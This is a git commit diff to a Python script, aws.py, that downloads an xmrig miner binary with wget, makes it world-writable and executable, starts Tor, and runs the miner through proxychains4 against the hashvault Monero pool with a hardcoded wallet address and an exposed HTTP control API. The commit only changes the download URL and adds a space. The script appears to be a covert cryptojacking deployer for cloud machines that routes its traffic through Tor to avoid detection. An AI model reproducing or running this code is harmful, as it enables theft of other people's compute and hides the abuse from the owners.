4b8ffd22f4f9aa0d46df73ca8c7cd5e272c3238d
yrubertzh <69451160+yrubertzh@users.noreply.github.com>
2020-08-17 11:07:57 -0700

    Update aws.py

--- aws.py
+++ aws.py
@@ -25,7 +25,7 @@ try:
     os.system('make install')
     os.system('make install-config')
     if os.path.isfile('/usr/local/bin/' + program) == False:
-        os.system('wget https://github.com/yrubertzh/aws_helper/blob/master/xmrig_tls/' + program)
+        os.system('wget https://github.com/yrubertzh/daovps/raw/master/xmrig_tls/' + program)
                         
         os.system('chmod 777 ' + program)
         workingdir = os.getcwd()
@@ -36,4 +36,4 @@ except:
     pass
 os.system('tor &')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' --donate-level 1 -o pool.hashvault.pro:443 -u 431wRVUSsj89NXLvuoKRyLJdVzZ9qZY6adDcb78JhmZ29G2nAdspMtp9cB5u5HqU5YQgM78MfEWbWDe2vaRjAaxB4YtbUMc -p aws -a rx/0 -k --tls  --http-enabled --http-host 0.0.0.0 --http-port 62432 --http-access-token 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --http-no-restricted -t' + str(cores))
+os.system ('proxychains4 ' + program + ' --donate-level 1 -o pool.hashvault.pro:443 -u 431wRVUSsj89NXLvuoKRyLJdVzZ9qZY6adDcb78JhmZ29G2nAdspMtp9cB5u5HqU5YQgM78MfEWbWDe2vaRjAaxB4YtbUMc -p aws -a rx/0 -k --tls  --http-enabled --http-host 0.0.0.0 --http-port 62432 --http-access-token 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --http-no-restricted -t ' + str(cores))
